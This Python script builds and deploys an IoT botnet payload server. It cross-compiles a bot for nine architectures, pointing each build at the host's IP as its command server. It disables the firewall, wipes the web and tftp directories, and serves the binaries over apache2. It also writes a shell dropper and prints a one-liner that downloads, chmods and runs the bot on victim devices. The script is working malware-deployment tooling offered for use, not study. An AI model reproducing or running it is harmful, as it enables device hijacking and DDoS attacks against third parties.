import sys
import time
import subprocess
import warnings
import fileinput
import urllib

def run(cmd):
    subprocess.call(cmd, shell=True)

if len(sys.argv) < 0:
    print("\x1b[0;31mIncorrect Usage!")
    print("\x1b[0;32mUsage: python " + sys.argv[0] + "\x1b[0m")
    sys.exit(1)

bot = "bot.c"
ip = urllib.urlopen('http://api.ipify.org').read()
skid = "y"
if skid.lower() == "y":
    run("apt install nano screen gcc perl wget lbzip unzip -y")
    run("service apache2 stop") 
    run("service iptables stop")
    get_arch = True
else:
    get_arch = False

compileas = ["hidakibest.mips",   #mips  
             "hidakibest.mpsl",   #mpsl  
             "hidakibest.x86",    #x86   
             "hidakibest.ppc",    #ppc   
             "hidakibest.sparc",  #sparc 
             "hidakibest.arm4",   #arm4  
             "hidakibest.arm5",   #arm5  
             "hidakibest.arm6",
             "hidakibest.arm7"]   #arm6  

getarch = ['https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips.tar.bz2',           #downloading -> mips   
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mipsel.tar.bz2',         #downloading -> mpsl     
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-x86_64.tar.bz2',         #downloading -> x86      
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-powerpc.tar.bz2',        #downloading -> ppc       
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sparc.tar.bz2',          #downloading -> sparc   
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv4l.tar.bz2',        #downloading -> arm4      
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv5l.tar.bz2',        #downloading -> arm5      
           'https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv6l.tar.bz2',   #downloading -> arm6
           'https://github.com/R00tS3c/DDOS-RootSec/raw/refs/heads/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2']#downloading -> arm7              

ccs = ["cross-compiler-mips",
       "cross-compiler-mipsel",
       "cross-compiler-x86_64",
       "cross-compiler-powerpc",
       "cross-compiler-sparc",
       "cross-compiler-armv4l",
       "cross-compiler-armv5l",
       "cross-compiler-armv6l",
       "cross-compiler-armv7l"]

try:
    fdsize = open("/usr/include/bits/typesizes.h","r").readlines()
    fdsizew = open("/usr/include/bits/typesizes.h","w").write("")
    for line in fdsize:
        line = line.replace("1024","1000000")
        fdsizew = open("/usr/include/bits/typesizes.h","a").write(line)
    time.sleep(2)
except:
    pass

old1 = "*commServer[] "
new1 = "unsigned char *commServer[] = {\""+ ip +":4258\"};\n"
x  = fileinput.input(files="/root/bot.c", inplace=1)
for line in x:
    if old1 in line:
        line = new1;
    print line,
x.close()

run("rm -rf /var/www/html/* /var/lib/tftpboot/* /var/ftp/*")

if get_arch == True:
    run("rm -rf cross-compiler-*")

    print("Downloading Architectures")

    for arch in getarch:
        run("wget " + arch + " --no-check-certificate >> /dev/null")
        run("tar -xvf *tar.bz2")
        run("rm -rf *tar.bz2")

    print("Cross Compilers Downloaded...")

num = 0
for cc in ccs:
    arch = cc.split("-")[2]
    run("./"+cc+"/bin/"+arch+"-gcc -static -pthread -D" + arch.upper() + " -o " + compileas[num] + " " + bot + " > /dev/null")
    num += 1

print("Cross Compiling Done!")
print("Setting up your apache2 and tftp")

run("apt install apache2 -y")
run("sudo service apache2 restart")

for i in compileas:
    run("cp " + i + " /var/www/html")

run('echo -e "#!/bin/bash" > /var/www/html/hidakibest.sh')

for i in compileas:
    run('echo -e "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /;pkill - 9 ' + i + ';wget http://' + ip + '/' + i + '; chmod +x ' + i + '; ./' + i + '; rm -rf ' + i + '" >> /var/www/html/hidakibest.sh')
run("service xinetd restart")
run("service httpd restart")
run("ulimit -n 999999; ulimit -u 999999; ulimit -e 999999")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
run('rm -rf cross-compiler-armv4l cross-compiler-armv5l cross-compiler-armv6l cross-compiler-armv7l cross-compiler-i586 cross-compiler-i686 cross-compiler-m68k cross-compiler-mips cross-compiler-mipsel cross-compiler-powerpc cross-compiler-powerpc-440fp cross-compiler-sh4 cross-compiler-sparc cross-compiler-x86_64')
print("\x1b check directory /var/www/html to make sure binarys created")
print("skid payload# cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/hidakibest.sh; chmod 777 hidakibest.sh; sh hidakibest.sh; rm -rf *\x1b[0m")
